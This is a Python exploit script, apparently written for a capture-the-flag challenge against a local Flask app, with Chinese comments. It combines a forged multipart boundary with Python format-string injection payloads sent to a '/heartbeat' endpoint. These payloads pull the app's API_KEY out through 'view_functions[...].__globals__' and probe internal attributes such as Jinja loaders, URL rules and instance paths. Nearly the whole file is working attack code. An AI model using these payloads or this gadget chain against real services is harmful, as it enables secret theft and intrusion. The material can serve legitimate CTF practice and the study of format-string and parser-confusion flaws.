import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def debug_format(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    if len(text) > 300:
        print(f"[-] Payload too long: {len(text)}")
        return None
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    try:
        r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
        return r.text
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 检查 jinja_env 是否有什么有趣的属性
    print("\n[*] Exploring jinja_env attributes...")
    
    # jinja_env.loader.list_templates() 可以列出模板？但不能调用函数
    result = debug_format("{0.jinja_env.list_templates}")
    print(f"list_templates: {result}")
    
    # 检查 _prefixed_loaders
    result = debug_format("{0.jinja_env.loader._loaders}")  
    print(f"_loaders: {result}")
    
    # 检查 Flask 的 static_folder
    result = debug_format("{0.static_folder}")
    print(f"static_folder: {result}")
    
    # 检查是否有 before_request 或 after_request hooks
    result = debug_format("{0.before_request_funcs}")
    print(f"before_request_funcs: {result}")
    
    # 检查 url_map 的 rules - 可能有文件路径
    result = debug_format("{0.url_map._rules}")
    print(f"url_map._rules: {result}")
    
    # 关键：检查 app.instance_path
    result = debug_format("{0.instance_path}")
    print(f"instance_path: {result}")
    
    # 检查 app.name
    result = debug_format("{0.name}")
    print(f"app.name: {result}")
